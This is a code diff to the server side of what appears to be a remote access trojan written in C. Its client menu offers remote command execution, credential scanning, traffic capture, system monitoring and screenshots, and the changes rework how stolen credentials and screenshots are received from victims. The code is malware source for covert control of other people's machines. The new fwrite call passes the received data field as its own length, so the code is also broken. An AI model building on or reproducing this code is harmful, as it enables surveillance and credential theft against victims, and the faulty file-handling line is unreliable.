@@ -11,6 +11,7 @@
 #include "../commonutils.h"
 
 #define PORT 8080
+#define BUFFER_SIZE 1024*10
 
 char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n 4. Retrieve file\n 5. Capture traffic\n 6. Monitor the system \n 7.Screenshot the System \n 8. Return to clients menu ";
 
@@ -93,6 +94,8 @@ void get_credentials(int clientfd)
 
     sys_info[0]=0;
 
+    sleep(2);
+
     while ((bytes_read = read(clientfd, buffer, sizeof(buffer) - 1)) > 0) 
     {
         buffer[bytes_read] = '\0'; 
@@ -159,7 +162,7 @@ void get_system_info(int clientfd)
 
 void screenshot_system(int clientfd)
 {
-    char buffer[MAXLINE];
+    char buffer[MAXLINE*50];
     ssize_t bytes_read;
     int total_bytes = 0;
     FILE *fp = fopen("screenshot.png", "wb");
@@ -171,14 +174,32 @@ void screenshot_system(int clientfd)
 
     printf("Receiving screenshot...\n");
     
-    while ((bytes_read = recv(clientfd, buffer, sizeof(buffer), 0)) > 0) {
-        if (strstr(buffer, "<END_OF_DATA>")) {
-            break;
-        }
-        fwrite(buffer, 1, bytes_read, fp);
-        total_bytes += bytes_read;
-        printf("Received %d bytes\n", total_bytes);
-    }
+    // char size[32];
+    // read(clientfd,size,32);
+    // char endline;
+    // read(clientfd,&endline,1);
+
+    // int is_finished=0;
+    
+    // while ((bytes_read = recv(clientfd, buffer, sizeof(buffer), 0)) > 0) {
+    //     char *end_marker = strstr(buffer, "<END_OF_DATA>");
+    //     if (end_marker != NULL) 
+    //     {
+    //         *end_marker = '\0';
+    //     }  
+    //     fwrite(buffer, 1, bytes_read, fp);
+    //     total_bytes += bytes_read;
+    //     printf("Received %d bytes\n", total_bytes);
+    //     printf("%s",buffer);
+    //     if(is_finished) break;
+    // }
+
+    struct file_struct received_file;
+
+    read(clientfd,&received_file,sizeof(received_file));
+
+    fwrite(received_file.file_bytes,1,received_file.file_bytes,fp);
+
 
     fclose(fp);
     printf("Screenshot saved as screenshot.png (%d bytes)\n", total_bytes);
